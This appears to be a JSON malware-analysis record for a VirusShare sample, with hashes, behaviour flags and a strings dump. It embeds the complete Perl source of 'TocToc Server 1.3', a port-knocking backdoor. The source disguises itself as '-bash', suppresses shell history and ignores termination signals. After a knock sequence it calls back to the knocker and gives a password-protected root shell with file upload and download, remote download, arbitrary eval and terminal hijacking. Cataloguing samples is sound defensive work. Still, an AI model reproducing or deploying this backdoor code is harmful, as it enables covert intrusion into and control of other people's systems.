{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "PUT": "May write to a file",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "kill": "May delete a file",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac",
            "write": "May write to a file"
        },
        "macro": "#!/usr/bin/perl\n# TocToc Server 1.3\n#\n#     0ldW0lf - oldwolf@atrixteam.net\n#             - old-wolf@zipmail.com\n#             - www.atrixteam.net\n#\n#\n######### CONFIGURATION ###########\nmy $proc_name='-bash';            # process name\nmy $pdev=\"\";                      ## extern interface - if none\n                                  ## especifyed it will be looked up\nmy $pass = 'CRYPTED';             # Crypted password\nmy $bdp= $ARGV[0] || 6767;        # BackDoor port\nmy $home = \"/\";                   # HOME directory\nmy $shell = \"/bin/bash\";          # Shell location\nmy @commands = (                  ## Commands to be executed\n'cat /etc/issue.net 2> /dev/null',## before run $shell\n'id',                             ## you can also use ';' to\n'uname -a'                        ## separate them: \n);                                ## my @commands = ('id;uname -a');\nmy @bashrc = (                    # The bashrc lines gonna be written\n  'alias ls=\\'ls $LS_OPTIONS\\''   # in \"$home/.bashrc before a shell\n);                                # be spawned and deleted after it\n###################################\n\n####################################\n# You can change the ENV stuff too #\n####################################\n\n#### ENVironment ####\n$ENV{HOME}       = $home;\n$ENV{PS1}        = '[\\u@\\h \\W]: '; # the way i like :)\n$ENV{MAIL}       = '/var/mail/root';\n$ENV{HISTFILE}   = '/dev/null';\n$ENV{USER}       = 'root';\n$ENV{LOGNAME}    = 'root';\n$ENV{LS_OPTIONS} = ' --color=auto -F -b -T 0';\n$ENV{LS_COLORS}  = 'no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.bz2=01;31:*.rpm=01;31:*.deb=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.mpg=01;37:*.avi=01;37:*.mov=01;37:';\n$ENV{SHELL}      = $shell;\n$ENV{TERM}       = 'xterm';\n#####################\n\n########################################\n# Probably you don\ufffdt wanna change that #\n########################################\n\n# DO NOT ADD SIG{INT} HERE\n###### SIGnals ######\n$SIG{HUP}  = 'IGNORE';\n$SIG{TERM} = 'IGNORE';\n$SIG{CHLD} = sub { wait; };\n#####################\n\n####################################\n### Don\ufffdt make any change unless ###\n### you know what your are doing ###\n####################################\nmy $buffer = 4096;\n\n$0=$proc_name.\"\\0\"x16;\nmy $pid=fork;\nexit if $pid;\nchdir(\"/\");\n\n# Modules needed #\nuse Net::RawIP;\nuse IO::Socket;\nuse IO::Pty;\nuse IO::Handle;\nuse IO::Stty;\nuse IO::Socket;\nuse IO::Select;\nuse Term::ReadKey;\nuse LWP::UserAgent;\nuse Cwd;\n##################\n\n# to use ioctl\neval {\n  require 'ioctl.ph';\n  require 'sys/ioctl.ph'; \n  require 'asm/ioctls.ph';\n};\n\nuse strict;\n\nmy $VERSION = \"1.3\";\n\nmy $bdp1 = $bdp-1;\nmy $bdp2 = $bdp+1;\nmy $psize = 1024;\nmy $ptout = 64;\nmy $ip = 20;\nmy (%c_ipt, @p, %pd);\n\n$pdev=Net::RawIP::lookupdev($ptout) unless $pdev;\nmy $ifs = ifaddrlist;\nmy $LIP = $ifs->{$pdev};\nmy $pfil = \"tcp and ( dst host $LIP )\";\n\nmy $c=0;\nmy $p=new Net::RawIP({ip=>{},tcp=>{}});\nmy $psck=$p->pcapinit($pdev,$pfil,$psize,$ptout);\nmy $offset=Net::RawIP::linkoffset($psck);\ndie \"Erro: Link offset not supported!\\n\" if (!$offset);\n\n\npipe(CHILD_RDR, PARENT_WTR);\n\nmy $pid = fork();\ndie \"Could not fork()\" if (not defined($pid));\n\nunless ($pid) {\n  chdir(\"$home\");\n\n  close(PARENT_WTR);\n\n  CHILD_RDR->autoflush(1);\n  my $rdr = new IO::Handle;\n  $rdr->fdopen(fileno(CHILD_RDR), 'r');\n  $rdr->blocking(0);\n\n  my %SHELL;\n  my %CLIENT;\n  my $connections = 0;\n\n  my $sel_serv = IO::Select->new();\n  my $sel_shell = IO::Select->new();\n\n  my $rdr_buf = '';\n  while ( 1 ) {\n    sleep(2) if ($connections == 0); # dont wast cpu when not needed\n\n    if (defined(my $n = $rdr->sysread($rdr_buf, 4096))) {\n      rdr_parse(\"$rdr_buf\");\n      $rdr_buf = '';\n    }\n\n    my @ready = $sel_serv->can_read(0);\n    foreach my $fh (@ready) {\n      my $msg;\n      my $nread = sysread($fh, $msg, 4096);\n\n      if ($nread == 0) {\n        close_client($fh);\n      } elsif (not defined($CLIENT{$fh}{senha})) {\n          my $m = $msg;\n          $m =~ s/\\n$//;\n          if (crypt($m, $pass) eq $pass) {\n            $CLIENT{$fh}{senha} = 1;\n            write_client($fh, \"\\002\\001\\002\\n\");\n            $fh->autoflush(1);\n            new_shell($fh);\n          } else {\n              finish_client($fh, \"\\001\\002\\001\\003\\n\");\n          }\n      } elsif (defined($CLIENT{$fh}{senha}) and $CLIENT{$fh}{senha} == 1) {\n          parse_msg($fh, $msg);\n      }\n    }\n    my @shell_ready = $sel_shell->can_read(0);\n    foreach my $shell (@shell_ready) {\n      read_shell($shell);\n    }\n  }\n\n##############\n# CHILD SUBS #\n##############\n  sub rdr_parse {\n    my $msg = shift;\n    my @lines = split(/\\n/, $msg);\n    foreach my $line (@lines) {\n      if ($line =~ /^CONN (.*)/) {\n        open_conn(split(':',$1));\n      }\n    }\n  }\n  sub open_conn {\n    my ($ip, $port) = @_;\n    my $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=> $ip, PeerPort=>$port, Timeout => 7) || return(undef);\n    $connections++;\n    $sel_serv->add($sock);\n    write_client($sock, \"\\001\\002\\001\\n\");\n  }\n\n  sub read_shell {\n    my $shell = shift;\n    my $cli;\n\n    my $msg = '';\n    foreach my $s (keys(%SHELL)) {\n      if ($SHELL{$s} eq $shell) {\n        $cli = $s;\n        last;\n      }\n    }\n\n    my $read = sysread($shell, $msg, $buffer);\n\n    if ($read == 0) {\n      finish_client($cli, \"Terminal closed.\\n\");\n      $shell->close;\n      $sel_shell->remove($shell);\n    } else {\n       write_client($cli, $msg);\n    }\n  }\n\n  sub gr_sock {\n    my $cli = shift;\n    foreach my $s ($sel_serv->can_write(1)) {\n      return($s) if ($s eq $cli);\n    }\n    return(undef);\n  }\n\n  sub gr_shell {\n    my $shell = shift;\n    foreach my $s ($sel_shell->can_write(1)) {\n      return($s) if ($s eq $shell);\n    }\n    return(undef);\n  }\n\n  sub new_shell {\n    my $cli = shift;\n    my $pty = new IO::Pty;\n\n    my $bashrc_file = \"$home/.bashrc\";\n    $bashrc_file =~ s/^\\/\\//\\//;\n\n    unless ($pty) {\n      finish_client($cli, \"ERRO: There is no PTY\ufffds devices available.\\n\");\n    }\n\n    my $pid = fork();\n    $CLIENT{$cli}{SHELL_PID} = $pid;\n \n    if (not defined($pid)) {\n      finish_client($cli, \"ERRO: fork()\\n\");\n    }\n\n\n    unless ($pid) {\n \n      $pty->make_slave_controlling_terminal();\n      my $slave = $pty->slave();\n      close $pty;\n\n      $slave->set_raw();\n      unless (open(STDIN,\"<&\". $slave->fileno())) {\n        finish_client($cli,\"Couldn't reopen STDIN for reading.\\n\");\n        exit;\n      }\n      unless (open(STDOUT,\">&\". $slave->fileno())) {\n         finish_client($cli, \"Couldn't reopen STDOUT for writing.\\n\");\n         exit;\n      }\n      unless (open(STDERR,\">&\". $slave->fileno())) {\n        finish_client($cli, \"Couldn't reopen STDERR for writing.\\n\");\n        exit;\n      }\n \n      STDOUT->autoflush(1);\n      STDIN->autoflush(1);\n      STDERR->autoflush(1);\n \n      close $slave;\n\n      ReadMode 0;\n      sleep 1;\n      IO::Stty::stty(\\*STDIN,\"sane\");\n\n      chdir(\"$home\");\n\n      my $command = join(';', @commands);\n      if (defined($command)) {\n        system(\"$command &\"); # '&' to execute it in backgroud\n        sleep(1); # to get the commands answer\n                  # i hope 1 sec is enougth\n      }\n\n      # writing out .bashrc\n      open(BRC, \"> $bashrc_file\");\n      print BRC join(\"\\n\", @bashrc);\n\n      { exec(\"$shell\") };\n\n      syswrite(STDOUT, \"ERRO: exec($shell)\\n\");\n      exit;\n    }\n    $pty->close_slave();\n    $pty->set_raw();\n    $SHELL{$cli} = $pty;\n    $sel_shell->add($pty);\n\n  }\n\n  sub parse_msg {\n    my ($cli, $msg) = @_;\n    if ($msg =~ /\\001T:(.+?)\\s(.*):\\002\\n/) {\n      while ($msg =~ m/\\001T:(.+?)\\s(.*):\\002\\n/g) {\n        my $cmd  = $1;\n        my $arg  = $2;\n        my @args = split(/ +/, $arg);\n        if ($arg eq \"ABORT\") {\n          if ($cmd eq \"DOWNLOAD\") {\n            my $pipe = $CLIENT{$cli}{DOWNLOAD_PIPE} if (defined($CLIENT{$cli}{DOWNLOAD_PIPE}));\n            if (defined($pipe)) {\n               print $pipe \"ABORT\\n\";\n               close($pipe);\n               delete($CLIENT{$cli}{DOWNLOAD_PIPE});\n            }\n          }\n          next;\n        } \n        if ($cmd eq \"TERM_SIZE\") {\n          my $shell = gr_shell($SHELL{$cli});\n          return() unless (scalar(@args) == 4);\n          SetTerminalSize(@args, $shell);\n          if (defined($CLIENT{$cli}{termsize})) {        \n            write_client($cli, \"\\nTerminal size has changed.\\n\\n\");\n          } else {\n              $CLIENT{$cli}{termsize} = 1;\n          }\n        } elsif ($cmd eq \"HIJACK\") {\n            my $chars = join(\" \", @args[1 .. $#args]);\n            hijack($cli, $args[0], $chars);\n        } elsif ($cmd eq \"GET\") {\n            sendfile($cli, @args);\n        } elsif ($cmd eq \"PUT\") {\n            getfile($cli, @args);\n        } elsif ($cmd eq \"EVAL\") {\n            my $ret = eval \"$arg\";\n            spm_done($cli, $cmd, \"Evaluation returned: $ret\");\n        } elsif ($cmd eq \"SOCKLIST\") {\n            socklist($cli, \"$arg\");\n            spm_done($cli, $cmd);\n        } elsif ($cmd eq \"PROXY\") {\n            proxy($cli, @args);\n        } elsif ($cmd eq \"PWD\") {\n            my $dir = getcwd();\n            spm_done($cli, $cmd, \"$dir\");\n        } elsif ($cmd eq \"LAG\") {\n            spm_done($cli, $cmd, $arg);\n        } elsif ($cmd eq \"CD\") {\n            if (chdir(\"$arg\")) {\n              my $dir = getcwd();\n              spm($cli, $cmd, \"Changed directory to: $dir\");\n            } else {\n               spm($cli, $cmd, \"I could not change directory to: $arg\");\n            }\n            spm_done($cli, $cmd);\n        } elsif ($cmd eq \"DOWNLOAD\") {\n            my ($url, $file) = @args;\n            my $pwd = getcwd();\n            unless(defined($file)) {\n              $file = $url;\n              $file =~ s/^.*\\/(\\S+)$/$1/;\n            }\n            $file = \"$pwd/$file\";\n            $file =~ s/^\\/\\//\\//;\n\n            unless(open(FILE, \"> $file\")) {\n              spm_done($cli, $cmd, \"Error: Cannot creat $file\");\n              next;\n            }\n\n            close(FILE);\n            unless(download($cli, $url, $file))  {\n              spm_done($cli, $cmd, \"Error: I could not fork() the process.\");\n              next;\n            }\n        } elsif ($cmd eq \"PS\") {\n            my @ps = ps();\n            if (scalar(@ps) == 0) {\n              spm_done($cli, $cmd, \"None hidden procces has been found.\");\n            } else {\n               foreach my $ps (@ps) {\n                 spm($cli, $cmd, \"$ps\");\n               }\n               spm_done($cli, $cmd);\n            }\n        } else {\n           spm_done($cli, $cmd, \"Error: Command not implemented in this version ($VERSION).\");\n        }\n\n      }\n    } else { \n       write_shell($cli, $msg);\n    }\n  }\n\n  sub spm_done {\n     my ($cli, $cmd, $msg) = @_;\n     if (defined($msg)) {\n       spm($cli, $cmd, $msg);\n     }\n     spm($cli, $cmd, \"DONE\");\n  }\n\n  sub spm {\n    my ($cli, $cmd, $ans) = @_;\n    write_client($cli, \"\\001T:$cmd $ans:\\002\\n\");\n  }\n\n  sub ps {\n    opendir(DIR, \"/proc\");\n    my @proc= readdir(DIR);\n    close DIR;\n    my @ps=`ps ax`;\n    my ($p, $c, $cmd, @retr);\n    for(@proc) {\n      $p = $_;\n      if (/^\\d+/) {\n        $c=0;\n        for (@ps) {\n          /(\\d+)\\s+/;\n          if ($p == $1) { $c=1; }\n        }\n        if ($c == 0) {\n          open(PID, \"/proc/$p/cmdline\");\n          $cmd =<PID>;\n          close PID;\n          $cmd =~ s/\\0/ /g;\n          $cmd =~ s/^(.*)\\s+$/$1/;\n          push (@retr, \"PID: $p ($cmd)\");\n        }\n      }\n    }\n    return (@retr);\n  }\n\n  sub hijack {\n    my ($cli, $device, $msg) = @_;\n    unless(open(TTY, \"+>$device\")) {\n      spm_done($cli, \"HIJACK\", \"I could not open tty $device\");\n      return();\n    }\n\n    # i hope it works\n    unless (defined(&TIOCSTI)) {\n      spm($cli, \"HIJACK\", \"WARNING: Trying to define &TIOCSTI, propably 'sys/ioctl.ph' wasn't loaded. Its not recommended to go on, type 'close' or type the last command again ($msg).\");\n      eval 'sub TIOCSTI () {0x5412;}';\n      spm_done($cli, \"HIJACK\");\n    }\n\n    $msg .= \"\\n\";\n\n    foreach my $char (split('', $msg)) {\n      spm($cli, \"HIJACK\", \"Hey yo! I couldn't write on $device: $!\")\n      unless (ioctl(TTY, &TIOCSTI, $char));\n    }\n    close(TTY);\n    spm_done($cli, \"HIJACK\");\n  }\n\n  sub getfile {\n     my ($cli, $file, $port) = @_;\n     $cli = gr_sock($cli);\n     my $pid = fork();\n     return(undef) if (not defined($pid));\n     unless ($pid) {\n       my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => \"$port\", Proto => 'tcp', Timeout=> 10);\n       exit unless($transfer);\n       $transfer->autoflush(1);\n\n       my $OK = 1;\n       if (-e \"$file\") {\n         syswrite($transfer, \"File already exists.\", 20);\n         $OK = 0;\n       }\n       unless (open(FILE, \"> $file\")) {\n         syswrite($transfer, \"I could not open the file.\", 26);\n         $OK = 0;\n       }\n\n       syswrite($transfer, \"OK\", 2) if ($OK == 1);\n\n       my $msg;\n       my $got_info = 0;       \n       my $bytes = 0;\n\n       while ( 1 ) {\n          my $ready = sysread($transfer, $msg, $buffer);\n          if ($ready == 0) {\n             close(FILE);\n             exit;\n          }\n          if ($got_info == 0) {\n            $got_info = 1;\n            syswrite($transfer, '0', 1);\n            next;\n          }\n          print FILE $msg;\n          $bytes += length($msg);\n          syswrite($transfer, $bytes, length($bytes));\n       }\n\n       exit;\n     }\n  }\n\n\n  sub sendfile {\n     my ($cli, $file, $port) = @_;\n     $cli = gr_sock($cli);\n     my $pid = fork();\n     return(undef) if (not defined($pid));\n     unless ($pid) {\n       my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => \"$port\", Proto => 'tcp', Timeout=> 10);\n       exit unless($transfer);\n       $transfer->autoflush(1);\n\n       unless (-e \"$file\") {\n          syswrite($transfer, \"File not found.\", 15);\n       }\n       unless (open(FILE, \"< $file\")) {\n         syswrite($transfer, \"I could not open the file.\", 26);\n       }\n\n\n       my $bytes = (stat(\"$file\"))[7];\n       syswrite($transfer, $bytes, length($bytes));\n\n       my $msg;\n       \n       while ( 1 ) {\n          my $ready = sysread($transfer, $msg, $buffer);\n          if ($ready == 0) {\n            close(FILE);\n            exit;\n          }\n          seek(FILE, $msg, 0);\n          my $send_bytes;\n          read(FILE, $send_bytes, $buffer);\n          syswrite($transfer, $send_bytes, length($send_bytes));\n       }\n\n       exit;\n     }\n  }\n\n  # socklist by Larry Doolittle <ldoolitt@jlab.org> September 1997\n  # adapted for TocToc use\n  sub socklist {\n    my ($cli, $proto) = @_;\n    undef($proto) if ($proto eq \"0\" );\n\n    our $init = 0;\n\n    my %sock_proc;\n    opendir (PROC, \"/proc\") || spm($cli, \"SOCKLIST\", \"Error: Could not open /proc\");\n    for my $f (readdir(PROC)) {\n        next if (! ($f=~/[0-9]+/) );\n        if (! opendir (PORTS, \"/proc/$f/fd\")) {\n            closedir PORTS;\n            next;\n        }\n        for my $g (readdir(PORTS)) {\n            next if (! ($g=~/[0-9]+/) );\n            my $r=readlink(\"/proc/$f/fd/$g\");\n    \n            my ($dev,$ino)=($r=~/^(socket|\\[[0-9a-fA-F]*\\]):\\[?([0-9]*)\\]?$/);\n  \n            if ($dev == \"[0000]\" || $dev == \"socket\") {$sock_proc{$ino}=$f.\":\".$g;}    }\n        closedir PORTS;\n    }\n    closedir PROC;\n\n    sub scheck {\n      open(FILE,\"/proc/net/\".$_[0]) || spm($cli, \"SOCKLIST\", \"Error: Could not open file /proc/net/\".$_[0].\" for reading.\");\n      while (<FILE>) {\n          my @F=split();\n          next if ($F[9]=~/uid/);\n          my @A=split(\":\",$F[1]);\n          my $a=hex($A[1]);\n          my ($pid,$fd)=($sock_proc{$F[9]}=~m.([0-9]*):([0-9]*).);\n          my $cmd = \"\";\n          if ($pid && open (CMD,\"/proc/$pid/status\")) {\n             my $l = <CMD>;\n             ($cmd) = ( $l=~/Name:\\s*(\\S+)/ );\n             close(CMD);\n          }\n          if ($init == 0 ) {\n              spm($cli, \"SOCKLIST\", \"type  port      inode     uid    pid   fd  name\");\n              $init = 1;\n          }\n          my $string = sprintf(\"%s %6d %10d  %6d %6d %4d  %s\", $_[0],$a ,$F[9], $F[7], $pid, $fd, $cmd);\n          spm($cli, \"SOCKLIST\", $string);\n      }\n      close(FILE);\n    }\n    if (not defined($proto)) {\n      scheck(\"tcp\");\n      scheck(\"udp\");\n      scheck(\"raw\");\n    } elsif (grep { $_ eq $proto } (\"tcp\", \"udp\", \"raw\")) {\n        scheck(\"$proto\");\n    } else {\n       spm($cli, \"SOCKLIST\", \"Error: protocol \".uc($proto).\" not found in the list (UDP, TCP, RAW)\");\n    }\n \n  }\n       \n  sub download {\n    my ($cli, $link, $file) = @_;\n\n    pipe(RDR, WTR);\n    WTR->autoflush(1);\n    RDR->autoflush(1);\n\n    $CLIENT{$cli}{DOWNLOAD_PIPE} = \\*WTR;\n\n    my $pid = fork();\n    return(undef) if not defined($pid);\n\n    unless($pid) {\n      close(WTR);\n      unless(open(FILE, \"> $file\")) {\n        spm_done($cli, \"DOWNLOAD\", \"I could not open $file for writting\");\n        exit;\n      }\n\n      my $first = 1;\n\n      my $init_time;\n      my $saved_data = 0;\n      if ($link =~ /^http/i) {\n        my $ua = LWP::UserAgent->new(keep_alive => 1,  timeout => 30 );\n        my $req = new HTTP::Request GET => $link;\n\n        my $res = $ua->request($req,\\&http_save_data, 4096);\n        $init_time = time;\n        if ($res->header(\"X-Died\") || !$res->is_success) {\n          spm($cli, \"DOWNLOAD\", \"Error: Download was interrupted by peer\");\n        } else {\n           spm($cli, \"DOWNLOAD\", \"Download finished, file $file has been saved.\");\n        }\n      } elsif ($link =~ /^ftp/i) {\n          $link =~ s/^ftp:\\/\\///;\n          $link =~ /(.+?)\\/(.*)/;\n          my $host = $1;\n          my $file = $2;\n          my $save = $link;\n          $save =~ s/.*\\/(.+?)$/$1/;\n\n          unless ($host or $file) {\n            spm_done($cli, \"DOWNLOAD\", \"Unrecognized ftp link\");\n            exit;\n          }\n          my $sock = IO::Socket::INET->new(PeerAddr => \"$host\", PeerPort => 21, Proto => \"tcp\", Timeout => 15);\n          unless ($sock) {\n            spm_done($cli, \"DOWNLOAD\", \"Error: I could not connect on host ($host:21)\");\n            exit;\n          }\n\n          my $logado = 0;\n          print $sock \"USER anonymous\\nPASS anonymous\\@anonymous.com\\n\";\n          my ($size, $trans);\n\n          while (<$sock>) {\n             my $buf = $_;\n             $buf =~ s/\\n//;\n             if ($buf =~ /^230/ and $logado == 0) {\n               $logado = 1;\n\n               print $sock \"TYPE I\\nPASV\\nRETR $file\\n\";\n             } elsif ($buf =~ /^150.+?\\((\\d+)\\s.+?\\)/) {\n                $size = $1;\n                $init_time = time;\n                my $saved_data = 0;\n                open(FILE, \"> $save\");\n                while (<$trans>) {\n                  print FILE $_;\n                  $saved_data += length($_);\n                  gotta_die();\n                  if ($first == 1) {\n                    spm($cli, \"DOWNLOAD\", \"Status: Downloading $link ($size size). Type ^C to abort\");\n                    $first = 0;\n                  } else {\n                     spm($cli, \"DOWNLOAD\", \"$init_time $saved_data $size\");\n                  }\n                }\n                close(FILE);\n                print $sock \"QUIT\\n\";\n                last;\n             } elsif ($buf =~ /^530/ and $logado == 1) {\n                 spm_done($cli, \"DOWNLOAD\", \"Error: File not found.\");\n                 exit;\n             } elsif ($buf =~ /^227.+?\\((.*)\\)/) {\n                 my @info = split(',', $1);\n                 my $host = join('.', @info[0 .. 3]);\n                 my $port = $info[4] * 256 + $info[5];\n                 $trans = IO::Socket::INET->new(PeerAddr => \"$host\", PeerPort => \"$port\", Proto => \"tcp\");\n                 unless ($trans) {\n                   spm_done($cli, \"DOWNLOAD\", \"Error: I could not estabilish the transfer connection\\n\");\n                   exit;\n                 }\n             }\n          }\n      }\n\n      spm_done($cli, \"DOWNLOAD\");\n      sleep(1);\n      exit;\n\n      sub http_save_data {\n        my($data, $response, $protocol) = @_;\n        print FILE $data;\n        gotta_die();\n        $saved_data += length($data);\n        my $total_data = $response->content_length;\n\n        if ($first == 1) {\n          spm($cli, \"DOWNLOAD\", \"Status: Downloading $link ($total_data size). Type ^C to abort\");\n          $first = 0;\n        } else {\n            spm($cli, \"DOWNLOAD\", \"$init_time $saved_data $total_data\");\n        }\n\n      }\n      sub gotta_die {\n        my $readfields = '';\n        vec($readfields, fileno(RDR), 1) = 1;\n        my $ready = select($readfields, undef, undef, 0);\n        if ($ready == 1) {\n          spm_done($cli, \"DOWNLOAD\", \"Operetion aborted!\");\n          sleep(1);\n          exit;\n        }\n      }\n    }\n    close(RDR);\n    return(1);\n  }\n\n      \n  sub write_shell {\n    my ($cli, $msg) = @_;\n    my $shell = gr_shell($SHELL{$cli});\n\n    unlink(\"$home/.bashrc\") if (-e \"$home/.bashrc\"); # here we check and delete \n                                                     # the file\n    return(syswrite($shell, $msg, length($msg)));\n  }\n\n  sub write_client {\n     my ($cli, $msg) = @_;\n     my $cli_sock = gr_sock($cli);\n     return() if (not defined($cli_sock));\n     syswrite($cli_sock, $msg, length($msg));\n  }\n\n  sub finish_client {\n    my ($cli, $msg) = @_;\n    write_client($cli, $msg);\n    close_client($cli);\n  }\n\n  sub close_client {\n    my $cli = gr_sock(shift);\n    $sel_serv->remove($cli);\n    if (defined($SHELL{$cli})) {\n      my $shell = $SHELL{$cli};\n      $sel_serv->remove($shell);\n      close($shell);\n      my $shell_pid = $CLIENT{$cli}{SHELL_PID};\n      kill(9, $shell_pid) if ($shell_pid);\n      delete($SHELL{$cli});\n    }\n    delete($CLIENT{$cli});\n    $cli->close() if(defined($cli));\n    $connections--;\n  }\n\n} # END OF CHILD   \nclose(CHILD_RDR);\n \nwhile ( 1 ) {\n  loop $psck,-1,\\&parse,@p;\n}\n\n#############\n# MAIN SUBS #\n#############\n\nsub conecta {\n#  print \"conectando no cliente...\\n\";\n  my ($ip, $port) = @_;\n  syswrite(PARENT_WTR, \"CONN $ip:$port\\n\");\n}\n\n# The parse() have been ripped from RawSniff (v0.8) by David Hulton\n# and addapted\n\nsub parse {\n  if ($c == 50) { $c=0; undef(%c_ipt) } # pra num gasta muita mem\n\n  my $pckt=$_[2];\n \n  my $flags=unpack(\"B8\",substr($pckt,$offset+$ip+13,1));\n  my $conck=substr($flags,6,1);\n  my $disconck=substr($flags,7,1);\n \n  my @saddr=unpack(\"CCCC\",substr($pckt,$offset+12,4));\n\n  $pd{'saddr'}=join('.',@saddr);\n  $pd{'shost'}=$pd{'saddr'};\n  my @daddr=unpack(\"CCCC\",substr($pckt,$offset+16,4));\n  $pd{'daddr'}=join('.',@daddr);\n  $pd{'dhost'}=$pd{'daddr'};\n  $pd{'sport'}=unpack(\"nn\",substr($pckt,$offset+$ip,4));\n  $pd{'dport'}=unpack(\"nn\",substr($pckt,$offset+$ip+2,4));\n  if ($conck) {\n    $c++;\n    $c_ipt{$c}{ip}   = $pd{'saddr'};\n    $c_ipt{$c}{port} = $pd{'dport'};\n    $c_ipt{$c}{'time'} = time;\n  }  \n  foreach my $con (keys(%c_ipt)) {\n    next if (not defined($c_ipt{$con+1}) or not defined($c_ipt{$con+2}));\n\n    if ($c_ipt{$con}{port} == $bdp1 and\n        $c_ipt{$con+1}{port} == $bdp2 and\n        $c_ipt{$con}{ip} eq $c_ipt{$con+1}{ip} and\n        $c_ipt{$con+2}{ip} eq $c_ipt{$con}{ip} and\n        ($c_ipt{$con+1}{'time'}-$c_ipt{$con}{'time'}) > 1 and\n        ($c_ipt{$con+1}{'time'}-$c_ipt{$con}{'time'}) < 10) {\n\n        conecta($c_ipt{$con}{ip}, $c_ipt{$con+2}{port});\n        undef(%c_ipt);\n        $c=0;\n        last;\n    }\n  }\n}\n\n"
    },
    "filename": "VirusShare_a1b7b28490853177bad8783090bc9101",
    "filesize": 23382,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "a1b7b28490853177bad8783090bc9101",
        "sha1": "8d4b097a181552471b444551518d0004c7759f06",
        "sha256": "10490edcf4057b7f3348840bffe37edda7af154c6fad54a2dd2b5efaa3ce43b4"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "# TocToc Server 1.3",
            "#     0ldW0lf - oldwolf@atrixteam.net",
            "#             - old-wolf@zipmail.com",
            "#             - www.atrixteam.net",
            "######### CONFIGURATION ###########",
            "my $proc_name='-bash';            # process name",
            "my $pdev=\"\";                      ## extern interface - if none",
            "                                  ## especifyed it will be looked up",
            "my $pass = 'CRYPTED';             # Crypted password",
            "my $bdp= $ARGV[0] || 6767;        # BackDoor port",
            "my $home = \"/\";                   # HOME directory",
            "my $shell = \"/bin/bash\";          # Shell location",
            "my @commands = (                  ## Commands to be executed",
            "'cat /etc/issue.net 2> /dev/null',## before run $shell",
            "'id',                             ## you can also use ';' to",
            "'uname -a'                        ## separate them: ",
            ");                                ## my @commands = ('id;uname -a');",
            "my @bashrc = (                    # The bashrc lines gonna be written",
            "  'alias ls=\\'ls $LS_OPTIONS\\''   # in \"$home/.bashrc before a shell",
            ");                                # be spawned and deleted after it",
            "###################################",
            "####################################",
            "# You can change the ENV stuff too #",
            "####################################",
            "#### ENVironment ####",
            "$ENV{HOME}       = $home;",
            "$ENV{PS1}        = '[\\u@\\h \\W]: '; # the way i like :)",
            "$ENV{MAIL}       = '/var/mail/root';",
            "$ENV{HISTFILE}   = '/dev/null';",
            "$ENV{USER}       = 'root';",
            "$ENV{LOGNAME}    = 'root';",
            "$ENV{LS_OPTIONS} = ' --color=auto -F -b -T 0';",
            "$ENV{LS_COLORS}  = 'no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.bz2=01;31:*.rpm=01;31:*.deb=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.mpg=01;37:*.avi=01;37:*.mov=01;37:';",
            "$ENV{SHELL}      = $shell;",
            "$ENV{TERM}       = 'xterm';",
            "#####################",
            "########################################",
            "# Probably you dont wanna change that #",
            "########################################",
            "# DO NOT ADD SIG{INT} HERE",
            "###### SIGnals ######",
            "$SIG{HUP}  = 'IGNORE';",
            "$SIG{TERM} = 'IGNORE';",
            "$SIG{CHLD} = sub { wait; };",
            "#####################",
            "####################################",
            "### Dont make any change unless ###",
            "### you know what your are doing ###",
            "####################################",
            "my $buffer = 4096;",
            "$0=$proc_name.\"\\0\"x16;",
            "my $pid=fork;",
            "exit if $pid;",
            "chdir(\"/\");",
            "# Modules needed #",
            "use Net::RawIP;",
            "use IO::Socket;",
            "use IO::Pty;",
            "use IO::Handle;",
            "use IO::Stty;",
            "use IO::Socket;",
            "use IO::Select;",
            "use Term::ReadKey;",
            "use LWP::UserAgent;",
            "use Cwd;",
            "##################",
            "# to use ioctl",
            "eval {",
            "  require 'ioctl.ph';",
            "  require 'sys/ioctl.ph'; ",
            "  require 'asm/ioctls.ph';",
            "use strict;",
            "my $VERSION = \"1.3\";",
            "my $bdp1 = $bdp-1;",
            "my $bdp2 = $bdp+1;",
            "my $psize = 1024;",
            "my $ptout = 64;",
            "my $ip = 20;",
            "my (%c_ipt, @p, %pd);",
            "$pdev=Net::RawIP::lookupdev($ptout) unless $pdev;",
            "my $ifs = ifaddrlist;",
            "my $LIP = $ifs->{$pdev};",
            "my $pfil = \"tcp and ( dst host $LIP )\";",
            "my $c=0;",
            "my $p=new Net::RawIP({ip=>{},tcp=>{}});",
            "my $psck=$p->pcapinit($pdev,$pfil,$psize,$ptout);",
            "my $offset=Net::RawIP::linkoffset($psck);",
            "die \"Erro: Link offset not supported!\\n\" if (!$offset);",
            "pipe(CHILD_RDR, PARENT_WTR);",
            "my $pid = fork();",
            "die \"Could not fork()\" if (not defined($pid));",
            "unless ($pid) {",
            "  chdir(\"$home\");",
            "  close(PARENT_WTR);",
            "  CHILD_RDR->autoflush(1);",
            "  my $rdr = new IO::Handle;",
